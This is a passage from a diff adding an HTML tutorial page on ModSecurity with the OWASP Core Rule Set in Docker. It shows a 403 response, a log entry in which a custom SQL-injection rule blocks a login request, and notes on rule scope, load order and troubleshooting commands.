+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>403 Forbidden<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>403 Forbidden<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span>nginx<span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</div></code></pre>
+<h3 id="%F0%9F%94%8D-step-5-check-for-rule-activation">🔍 Step 5: Check for Rule Activation</h3>
+<p>Check if your custom rule triggered by viewing logs:</p>
+<pre class="hljs"><code><div>docker-compose logs modsecurity | grep <span class="hljs-string">'id "1005"'</span>
+</div></code></pre>
+<p>log entry:</p>
+<pre class="hljs"><code><div><span class="hljs-selector-tag">modsecurity-1</span>  | 2025/04/12 19<span class="hljs-selector-pseudo">:56</span><span class="hljs-selector-pseudo">:29</span> <span class="hljs-selector-attr">[error]</span> 547<span class="hljs-selector-id">#547</span>: *31 <span class="hljs-selector-attr">[client 172.18.0.1]</span> <span class="hljs-selector-tag">ModSecurity</span>: <span class="hljs-selector-tag">Access</span> <span class="hljs-selector-tag">denied</span> <span class="hljs-selector-tag">with</span> <span class="hljs-selector-tag">code</span> 403 (<span class="hljs-selector-tag">phase</span> 2). <span class="hljs-selector-tag">Matched</span> "<span class="hljs-selector-tag">Operator</span> `<span class="hljs-selector-tag">Rx</span>' <span class="hljs-selector-tag">with</span> <span class="hljs-selector-tag">parameter</span> `<span class="hljs-selector-tag">application</span>/<span class="hljs-selector-tag">json</span>' <span class="hljs-selector-tag">against</span> <span class="hljs-selector-tag">variable</span> `<span class="hljs-selector-tag">REQUEST_HEADERS</span><span class="hljs-selector-pseudo">:Content-Type'</span> (<span class="hljs-selector-tag">Value</span>: `<span class="hljs-selector-tag">application</span>/<span class="hljs-selector-tag">json</span>' ) <span class="hljs-selector-attr">[file <span class="hljs-string">"/etc/modsecurity.d/owasp-crs/rules/custom-rules.conf"</span>]</span> <span class="hljs-selector-attr">[line <span class="hljs-string">"1"</span>]</span> <span class="hljs-selector-attr">[id <span class="hljs-string">"1005"</span>]</span> <span class="hljs-selector-attr">[rev <span class="hljs-string">""</span>]</span> <span class="hljs-selector-attr">[msg <span class="hljs-string">"Custom SQLi Rule"</span>]</span> <span class="hljs-selector-attr">[data <span class="hljs-string">""</span>]</span> <span class="hljs-selector-attr">[severity <span class="hljs-string">"0"</span>]</span> <span class="hljs-selector-attr">[ver <span class="hljs-string">""</span>]</span> <span class="hljs-selector-attr">[maturity <span class="hljs-string">"0"</span>]</span> <span class="hljs-selector-attr">[accuracy <span class="hljs-string">"0"</span>]</span> <span class="hljs-selector-attr">[tag <span class="hljs-string">"modsecurity"</span>]</span> <span class="hljs-selector-attr">[tag <span class="hljs-string">"modsecurity"</span>]</span> <span class="hljs-selector-attr">[hostname <span class="hljs-string">"172.18.0.3"</span>]</span> <span class="hljs-selector-attr">[uri <span class="hljs-string">"/rest/user/login"</span>]</span> <span class="hljs-selector-attr">[unique_id <span class="hljs-string">"174448778951.660669"</span>]</span> <span class="hljs-selector-attr">[ref <span class="hljs-string">"o11,11o11,1v138,40o0,11o0,1v11,11o0,16v102,16"</span>]</span>, <span class="hljs-selector-tag">client</span>: 172<span class="hljs-selector-class">.18</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>, <span class="hljs-selector-tag">server</span>: <span class="hljs-selector-tag">localhost</span>, <span class="hljs-selector-tag">request</span>: "<span class="hljs-selector-tag">POST</span> /<span class="hljs-selector-tag">rest</span>/<span class="hljs-selector-tag">user</span>/<span class="hljs-selector-tag">login</span> <span class="hljs-selector-tag">HTTP</span>/1<span class="hljs-selector-class">.1</span>", <span class="hljs-selector-tag">host</span>: "<span class="hljs-selector-tag">localhost</span><span class="hljs-selector-pseudo">:8080"</span>
+</div></code></pre>
+<!-- 🧠 Key Configuration Notes
+🧬 Rule Scope
+Matches across:
+
+REQUEST_BODY, ARGS, ARGS_NAMES
+
+REQUEST_URI, REQUEST_HEADERS
+
+Uses chain to require JSON content type
+
+🔐 File Permissions
+Mounted read-only via :ro
+
+Must be readable by the nginx user inside the container
+
+⏱️ Rule Load Order
+CRS loads rules alphabetically
+
+You may prefix with REQUEST-9XX- to ensure desired load sequence -->
+<p><img src="screnshoots/2.2/1.png" alt="">
+<img src="screnshoots/2.2/2.png" alt="">
+<img src="screnshoots/2.2/3.png" alt="">
+<img src="screnshoots/2.2/4.png" alt="">
+<img src="screnshoots/2.2/5.png" alt="">
+<img src="screnshoots/2.2/6.png" alt=""></p>
+<!-- 🛠️ Troubleshooting
+📍 Verify File Placement
+bash
+Copy
+Edit
+docker exec -it modsecurity ls -l /etc/modsecurity.d/owasp-crs/rules/
+Should include:
+
+vbnet
+Copy
+Edit
+custom-rules.conf
+✅ Validate Nginx Configuration
+bash
+Copy
+Edit
+docker exec -it modsecurity nginx -t
+Expected:
+
+bash
+Copy
+Edit
+nginx: configuration file /etc/nginx/nginx.conf test is successful
+👁️ Test in Detection Mode (Optional)
+In development, you can switch to detection mode to observe without blocking:
+
+apache
+Copy
+Edit
+SecRuleEngine DetectionOnly
+Monitor logs at /var/log/modsec_audit.log
+
+📁 Final Directory Structure (Inside Container)
+lua
+Copy
+Edit
+/etc/modsecurity.d/owasp-crs/
+├── crs-setup.conf
+└── rules/
+    ├── REQUEST-941-APPLICATION-ATTACK-XSS.conf
+    ├── REQUEST-942-APPLICATION-ATTACK-SQLI.conf
+    └── custom-rules.conf   <-- Your custom rule here -->
+
+</body>
+</html>
